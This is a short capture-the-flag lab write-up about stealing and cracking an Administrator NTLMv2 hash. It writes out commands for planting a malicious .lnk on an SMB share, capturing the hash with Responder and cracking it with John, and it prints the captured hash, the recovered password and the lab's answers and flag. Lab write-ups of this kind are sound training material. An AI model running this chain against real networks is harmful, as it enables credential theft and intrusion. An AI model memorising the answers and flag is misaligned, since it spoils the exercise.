# Tooling: ntlm_theft, responder, john

```bash
python3 ntlm_theft.py -g lnk -s <your_ip> -f stealthy
cd stealthy
smbclient //10.10.188.26/ElfShare/ -U guest%
smb: \>put stealthy.lnk
smb: \>get greedykeys.txt
smb: \>exit
```

```bash
responder -I ens5
```

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.188.26
[SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:3269921c66d01c94:E6A239E9E3E42636B4CF7150641B25C1:010100000000000080F4BA42CC35DA01A07FCAF1FA47C1890000000002000800480033003100320001001E00570049004E002D005A00360032003100520059005600580057004A004F0004003400570049004E002D005A00360032003100520059005600580057004A004F002E0048003300310032002E004C004F00430041004C000300140048003300310032002E004C004F00430041004C000500140048003300310032002E004C004F00430041004C000700080080F4BA42CC35DA01060004000200000008003000300000000000000000000000003000003C4D0969E6FD3FBEB9A9CD74577CE50F24B86773F7F6866E19BAC9AA0FF524510A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00320031002E003200340031000000000000000000
```

```bash
echo "Administrator::ELFHQSERVER:3269921c66d01c94:E6A239E9E3E42636B4CF7150641B25C1:010100000000000080F4BA42CC35DA01A07FCAF1FA47C1890000000002000800480033003100320001001E00570049004E002D005A00360032003100520059005600580057004A004F0004003400570049004E002D005A00360032003100520059005600580057004A004F002E0048003300310032002E004C004F00430041004C000300140048003300310032002E004C004F00430041004C000500140048003300310032002E004C004F00430041004C000700080080F4BA42CC35DA01060004000200000008003000300000000000000000000000003000003C4D0969E6FD3FBEB9A9CD74577CE50F24B86773F7F6866E19BAC9AA0FF524510A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00320031002E003200340031000000000000000000" > hash.txt
john --wordlist=greedykeys.txt hash.txt
```
`GreedyGrabber1@  (Administrator)`

Connect to RDP via Remmina


# What is the name of the AD authentication protocol that makes use of tickets?
Kerberos

# What is the name of the AD authentication protocol that makes use of the NTLM hash?
NetNTLM

# What is the name of the tool that can intercept these authentication challenges?
Responder

# What is the password that McGreedy set for the Administrator account?
GreedyGrabber1@

# What is the value of the flag that is placed on the Administratorâ€™s desktop?
THM{Greedy.Greedy.McNot.So.Great.Stealy}
